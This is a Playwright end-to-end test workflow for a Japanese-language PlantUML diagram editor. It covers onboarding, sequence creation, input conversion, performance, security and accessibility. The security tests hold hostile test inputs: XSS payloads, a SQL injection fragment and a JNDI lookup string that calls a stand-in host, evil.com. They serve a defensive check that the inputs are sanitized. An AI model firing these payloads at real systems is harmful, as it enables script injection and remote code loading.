/**
 * EditorWorkflow - PlantUML Editor メインワークフロー
 * 
 * Sprint3 Hybrid Object Model Framework
 * エディターの包括的なビジネスフローテストを提供
 */

import { PlantUMLEditorFlow } from '../base/BaseFlow.js';
import { EditorPage } from '../pages/EditorPage.js';
import { expect } from '@playwright/test';

export class EditorWorkflow extends PlantUMLEditorFlow {
  constructor(page, context = null) {
    super(page, context);
    this.editorPage = new EditorPage(page, context);
  }

  /**
   * 新規ユーザーオンボーディングフロー
   */
  async defineNewUserOnboardingFlow() {
    return this
      .defineStep(
        'ページアクセス',
        async (page) => {
          await this.editorPage.navigateToEditor();
          return { pageLoaded: true };
        },
        async (page, context, result) => {
          expect(result.pageLoaded).toBe(true);
          await this.editorPage.assertEditorFunctional();
        }
      )
      .defineStep(
        'チュートリアル表示確認',
        async (page) => {
          // 初回訪問時のチュートリアル確認
          const tutorialExists = await page.locator('.tutorial-overlay').count() > 0;
          if (tutorialExists) {
            await page.click('.tutorial-next-button');
          }
          return { tutorialShown: tutorialExists };
        }
      )
      .defineStep(
        'サンプルアクション作成',
        async (page) => {
          const sampleAction = {
            actorFrom: 'ユーザー',
            arrowType: '->',
            actorTo: 'システム',
            message: 'ログイン要求'
          };
          
          await this.editorPage.addAction(sampleAction);
          return { actionCreated: sampleAction };
        },
        async (page, context, result) => {
          const actions = await this.editorPage.getActionItems();
          expect(actions).toHaveLength(1);
          expect(actions[0].message).toBe('ログイン要求');
        }
      )
      .defineStep(
        'PlantUMLコード生成確認',
        async (page) => {
          const plantUMLCode = await this.editorPage.getPlantUMLCode();
          return { generatedCode: plantUMLCode };
        },
        async (page, context, result) => {
          expect(result.generatedCode).toContain('@startuml');
          expect(result.generatedCode).toContain('ユーザー -> システム');
          expect(result.generatedCode).toContain('ログイン要求');
        }
      )
      .defineStep(
        'プレビュー表示確認',
        async (page) => {
          await this.editorPage.waitForPreviewUpdate();
          const previewVisible = await this.editorPage.plantUMLPreview.isVisible();
          return { previewVisible };
        },
        async (page, context, result) => {
          expect(result.previewVisible).toBe(true);
        }
      );
  }

  /**
   * 複雑なシーケンス作成フロー
   */
  async defineComplexSequenceCreationFlow() {
    const complexScenario = [
      {
        actorFrom: 'フロントエンド',
        arrowType: '->',
        actorTo: 'API Gateway',
        message: 'ユーザー登録要求'
      },
      {
        actorFrom: 'API Gateway',
        arrowType: '->',
        actorTo: '認証サービス',
        message: 'トークン検証'
      },
      {
        actorFrom: '認証サービス',
        arrowType: '-->>',
        actorTo: 'API Gateway',
        message: '認証成功'
      },
      {
        actorFrom: 'API Gateway',
        arrowType: '->',
        actorTo: 'ユーザーDB',
        message: 'ユーザー情報保存'
      },
      {
        actorFrom: 'ユーザーDB',
        arrowType: '-->>',
        actorTo: 'API Gateway',
        message: '保存完了'
      },
      {
        actorFrom: 'API Gateway',
        arrowType: '-->>',
        actorTo: 'フロントエンド',
        message: '登録成功レスポンス'
      }
    ];

    return this
      .defineStep(
        'エディター初期化',
        async (page) => {
          await this.editorPage.navigateToEditor();
          await this.editorPage.reset();
          return { initialized: true };
        }
      )
      .defineDataDrivenStep(
        '複数アクション作成',
        async (page, context, actionData, index) => {
          await this.editorPage.addAction(actionData);
          
          // アクション追加後の確認
          const actions = await this.editorPage.getActionItems();
          expect(actions).toHaveLength(index + 1);
          
          return { actionIndex: index, actionData };
        },
        complexScenario
      )
      .defineStep(
        'シーケンス完成度確認',
        async (page) => {
          const plantUMLCode = await this.editorPage.getPlantUMLCode();
          const actionCount = (plantUMLCode.match(/->/g) || []).length + 
                            (plantUMLCode.match(/-->>/g) || []).length;
          
          return { 
            codeLength: plantUMLCode.length,
            actionCount,
            code: plantUMLCode
          };
        },
        async (page, context, result) => {
          expect(result.actionCount).toBe(6);
          expect(result.codeLength).toBeGreaterThan(200);
          expect(result.code).toContain('@startuml');
          expect(result.code).toContain('@enduml');
        }
      )
      .defineStep(
        'パフォーマンス検証',
        async (page) => {
          const performanceMetrics = await this.editorPage.performanceTest();
          return { performance: performanceMetrics };
        },
        async (page, context, result) => {
          if (result.performance.memory) {
            const memoryMB = result.performance.memory.used / (1024 * 1024);
            expect(memoryMB).toBeLessThan(100); // 100MB以内
          }
          
          expect(result.performance.editor.actionItemCount).toBe(6);
        }
      );
  }

  /**
   * 日本語入力変換フロー
   */
  async defineJapaneseInputConversionFlow() {
    const japaneseScenarios = [
      {
        input: 'ユーザーがシステムにログインする',
        expected: ['ユーザー', 'システム', 'ログイン']
      },
      {
        input: '管理者が認証システムを通じてユーザーデータベースにアクセスし、新規ユーザーを作成する',
        expected: ['管理者', '認証システム', 'ユーザーデータベース']
      },
      {
        input: 'フロントエンドがAPIを呼び出し、レスポンスを受信後、画面を更新する',
        expected: ['フロントエンド', 'API', '画面']
      }
    ];

    return this
      .defineStep(
        'エディター準備',
        async (page) => {
          await this.editorPage.navigateToEditor();
          await this.editorPage.reset();
          
          // 日本語入力サポート確認
          const japaneseSupported = await this.editorPage.checkJapaneseInputSupport(
            this.editorPage.selectors.japaneseInput
          );
          
          return { japaneseSupported };
        },
        async (page, context, result) => {
          expect(result.japaneseSupported).toBe(true);
        }
      )
      .defineDataDrivenStep(
        '日本語入力変換テスト',
        async (page, context, scenario, index) => {
          const startTime = Date.now();
          
          // 日本語入力から PlantUML 変換
          const result = await this.editorPage.convertJapaneseToPlantUML(scenario.input);
          
          const conversionTime = Date.now() - startTime;
          
          // 期待される要素が含まれているかチェック
          const containsExpected = scenario.expected.every(expected => 
            result.result && result.result.includes(expected)
          );
          
          return {
            input: scenario.input,
            output: result.result,
            conversionTime,
            containsExpected,
            scenario: index + 1
          };
        },
        japaneseScenarios,
        { continueOnDataError: true }
      )
      .defineStep(
        '変換結果統合検証',
        async (page, context) => {
          const plantUMLCode = await this.editorPage.getPlantUMLCode();
          const actionItems = await this.editorPage.getActionItems();
          
          return {
            finalCode: plantUMLCode,
            totalActions: actionItems.length,
            hasJapaneseContent: /[\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FAF]/.test(plantUMLCode)
          };
        },
        async (page, context, result) => {
          expect(result.totalActions).toBeGreaterThan(0);
          expect(result.hasJapaneseContent).toBe(true);
          expect(result.finalCode).toContain('@startuml');
        }
      );
  }

  /**
   * エラーハンドリングフロー
   */
  async defineErrorHandlingFlow() {
    return this
      .defineStep(
        'エディター初期化',
        async (page) => {
          await this.editorPage.navigateToEditor();
          return { initialized: true };
        }
      )
      .defineStep(
        '無効なアクション作成試行',
        async (page) => {
          const invalidAction = {
            actorFrom: '', // 空の値
            arrowType: '->',
            actorTo: 'システム',
            message: '' // 空のメッセージ
          };
          
          try {
            await this.editorPage.addAction(invalidAction);
            return { errorOccurred: false };
          } catch (error) {
            return { 
              errorOccurred: true, 
              errorMessage: error.message 
            };
          }
        },
        async (page, context, result) => {
          // エラーが適切にハンドリングされていることを確認
          expect(result.errorOccurred).toBe(true);
        }
      )
      .defineStep(
        '不正な PlantUML コード入力',
        async (page) => {
          const invalidCode = '@startuml\n無効な構文\n@enduml';
          
          await this.editorPage.setPlantUMLCode(invalidCode);
          
          const errorMessage = await this.editorPage.getErrorMessage();
          return { errorMessage };
        },
        async (page, context, result) => {
          expect(result.errorMessage).toBeTruthy();
        }
      )
      .defineStep(
        'ネットワークエラーシミュレーション',
        async (page) => {
          // ネットワーク遮断
          await page.route('**/*', route => route.abort());
          
          try {
            await this.editorPage.addAction({
              actorFrom: 'テスト',
              arrowType: '->',
              actorTo: 'システム',
              message: 'ネットワークテスト'
            });
            
            return { networkErrorHandled: false };
          } catch (error) {
            return { 
              networkErrorHandled: true,
              errorType: 'network'
            };
          } finally {
            // ネットワーク復旧
            await page.unroute('**/*');
          }
        }
      );
  }

  /**
   * パフォーマンステストフロー
   */
  async definePerformanceTestFlow() {
    return this
      .defineStep(
        'ベースライン測定',
        async (page) => {
          const startTime = Date.now();
          await this.editorPage.navigateToEditor();
          const loadTime = Date.now() - startTime;
          
          const initialMetrics = await this.editorPage.performanceTest();
          
          return { 
            loadTime,
            initialMetrics 
          };
        },
        async (page, context, result) => {
          expect(result.loadTime).toBeLessThan(5000); // 5秒以内
        }
      )
      .defineStep(
        '大量アクション作成負荷テスト',
        async (page) => {
          const actionCount = 50;
          const startTime = Date.now();
          
          for (let i = 0; i < actionCount; i++) {
            await this.editorPage.addAction({
              actorFrom: `Actor${i}`,
              arrowType: '->',
              actorTo: `System${i}`,
              message: `アクション${i + 1}`
            });
            
            // 10アクションごとにパフォーマンスチェック
            if ((i + 1) % 10 === 0) {
              const metrics = await this.editorPage.performanceTest();
              if (metrics.memory && metrics.memory.used > 150 * 1024 * 1024) { // 150MB超過時
                console.warn(`Memory usage high at action ${i + 1}: ${(metrics.memory.used / 1024 / 1024).toFixed(2)}MB`);
              }
            }
          }
          
          const totalTime = Date.now() - startTime;
          const finalMetrics = await this.editorPage.performanceTest();
          
          return {
            actionCount,
            totalTime,
            averageTimePerAction: totalTime / actionCount,
            finalMetrics
          };
        },
        async (page, context, result) => {
          expect(result.averageTimePerAction).toBeLessThan(500); // 500ms以内/アクション
          expect(result.totalTime).toBeLessThan(30000); // 30秒以内で完了
        }
      )
      .defineStep(
        'メモリリーク検証',
        async (page) => {
          const initialMemory = await page.evaluate(() => {
            return performance.memory ? performance.memory.usedJSHeapSize : 0;
          });
          
          // 大量の操作実行後にリセット
          await this.editorPage.reset();
          
          // ガベージコレクション強制実行
          await page.evaluate(() => {
            if (window.gc) {
              window.gc();
            }
          });
          
          await this.page.waitForTimeout(1000);
          
          const finalMemory = await page.evaluate(() => {
            return performance.memory ? performance.memory.usedJSHeapSize : 0;
          });
          
          const memoryLeak = finalMemory > initialMemory * 1.5; // 50%以上増加でリーク疑い
          
          return {
            initialMemory,
            finalMemory,
            memoryLeak
          };
        },
        async (page, context, result) => {
          expect(result.memoryLeak).toBe(false);
        }
      );
  }

  /**
   * セキュリティテストフロー
   */
  async defineSecurityTestFlow() {
    return this
      .defineStep(
        'XSS攻撃テスト',
        async (page) => {
          const xssPayloads = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>'
          ];
          
          const results = [];
          
          for (const payload of xssPayloads) {
            try {
              await this.editorPage.convertJapaneseToPlantUML(payload);
              
              // XSS実行チェック
              const xssExecuted = await page.evaluate(() => {
                return window.__xssExecuted || false;
              });
              
              results.push({
                payload,
                xssExecuted,
                blocked: !xssExecuted
              });
            } catch (error) {
              results.push({
                payload,
                xssExecuted: false,
                blocked: true,
                error: error.message
              });
            }
          }
          
          return { xssResults: results };
        },
        async (page, context, result) => {
          // すべてのXSS攻撃がブロックされていることを確認
          const allBlocked = result.xssResults.every(r => r.blocked);
          expect(allBlocked).toBe(true);
        }
      )
      .defineStep(
        'CSP違反検証',
        async (page) => {
          const cspViolations = await page.evaluate(() => {
            return window.__cspViolations || [];
          });
          
          return { cspViolations };
        },
        async (page, context, result) => {
          expect(result.cspViolations).toHaveLength(0);
        }
      )
      .defineStep(
        '入力サニタイゼーション確認',
        async (page) => {
          const maliciousInputs = [
            '<script>document.body.innerHTML="HACKED"</script>',
            '${jndi:ldap://evil.com/payload}',
            'SELECT * FROM users WHERE 1=1--',
            '"><script>alert("XSS")</script>'
          ];
          
          const sanitizedResults = [];
          
          for (const input of maliciousInputs) {
            await this.editorPage.addAction({
              actorFrom: 'テスト',
              arrowType: '->',
              actorTo: 'システム',
              message: input
            });
            
            const plantUMLCode = await this.editorPage.getPlantUMLCode();
            const containsMalicious = plantUMLCode.includes('<script>') || 
                                    plantUMLCode.includes('${jndi:') ||
                                    plantUMLCode.includes('SELECT *');
            
            sanitizedResults.push({
              input,
              sanitized: !containsMalicious
            });
          }
          
          return { sanitizedResults };
        },
        async (page, context, result) => {
          // すべての悪意ある入力がサニタイズされていることを確認
          const allSanitized = result.sanitizedResults.every(r => r.sanitized);
          expect(allSanitized).toBe(true);
        }
      );
  }

  /**
   * アクセシビリティテストフロー
   */
  async defineAccessibilityTestFlow() {
    return this
      .defineStep(
        'キーボードナビゲーションテスト',
        async (page) => {
          await this.editorPage.navigateToEditor();
          
          // Tab キーでの移動テスト
          const focusableElements = [];
          let currentElement = null;
          
          for (let i = 0; i < 10; i++) {
            await page.keyboard.press('Tab');
            currentElement = await page.evaluate(() => {
              const focused = document.activeElement;
              return {
                tagName: focused.tagName,
                id: focused.id,
                className: focused.className,
                type: focused.type || null
              };
            });
            
            focusableElements.push(currentElement);
          }
          
          return { focusableElements };
        },
        async (page, context, result) => {
          // フォーカス可能な要素が適切に配置されていることを確認
          expect(result.focusableElements).toHaveLength(10);
        }
      )
      .defineStep(
        'スクリーンリーダー対応確認',
        async (page) => {
          const accessibilityIssues = await this.editorPage.validateAccessibility();
          
          return { accessibilityIssues };
        },
        async (page, context, result) => {
          expect(result.accessibilityIssues).toHaveLength(0);
        }
      )
      .defineStep(
        'カラーコントラスト検証',
        async (page) => {
          const contrastResults = await page.evaluate(() => {
            const elements = document.querySelectorAll('*');
            const results = [];
            
            elements.forEach(el => {
              const styles = window.getComputedStyle(el);
              const backgroundColor = styles.backgroundColor;
              const color = styles.color;
              
              if (color !== 'rgba(0, 0, 0, 0)' && backgroundColor !== 'rgba(0, 0, 0, 0)') {
                results.push({
                  element: el.tagName + (el.id ? '#' + el.id : ''),
                  color,
                  backgroundColor
                });
              }
            });
            
            return results.slice(0, 20); // 最初の20要素のみ
          });
          
          return { contrastResults };
        }
      );
  }

  /**
   * 統合E2Eワークフロー
   */
  async defineIntegratedE2EWorkflow() {
    return this
      .defineStep(
        'フル機能統合テスト開始',
        async (page) => {
          await this.editorPage.navigateToEditor();
          return { started: true };
        }
      )
      .defineStep(
        '新規ユーザーオンボーディング実行',
        async (page) => {
          const onboardingFlow = await this.defineNewUserOnboardingFlow();
          const result = await onboardingFlow.execute();
          return { onboardingResult: result };
        }
      )
      .defineStep(
        '複雑シーケンス作成実行',
        async (page) => {
          const complexFlow = await this.defineComplexSequenceCreationFlow();
          const result = await complexFlow.execute();
          return { complexFlowResult: result };
        }
      )
      .defineStep(
        '日本語変換フロー実行',
        async (page) => {
          const japaneseFlow = await this.defineJapaneseInputConversionFlow();
          const result = await japaneseFlow.execute();
          return { japaneseFlowResult: result };
        }
      )
      .defineStep(
        'パフォーマンステスト実行',
        async (page) => {
          const performanceFlow = await this.definePerformanceTestFlow();
          const result = await performanceFlow.execute();
          return { performanceResult: result };
        }
      )
      .defineStep(
        'セキュリティテスト実行',
        async (page) => {
          const securityFlow = await this.defineSecurityTestFlow();
          const result = await securityFlow.execute();
          return { securityResult: result };
        }
      )
      .defineStep(
        'アクセシビリティテスト実行',
        async (page) => {
          const accessibilityFlow = await this.defineAccessibilityTestFlow();
          const result = await accessibilityFlow.execute();
          return { accessibilityResult: result };
        }
      )
      .defineStep(
        '統合結果検証',
        async (page, context) => {
          const allResults = {
            onboarding: context.onboardingResult,
            complex: context.complexFlowResult,
            japanese: context.japaneseFlowResult,
            performance: context.performanceResult,
            security: context.securityResult,
            accessibility: context.accessibilityResult
          };
          
          return { integratedResults: allResults };
        },
        async (page, context, result) => {
          // すべてのフローが成功していることを確認
          Object.values(result.integratedResults).forEach(flowResult => {
            expect(flowResult.failedSteps).toBe(0);
          });
        }
      );
  }
}

export default EditorWorkflow;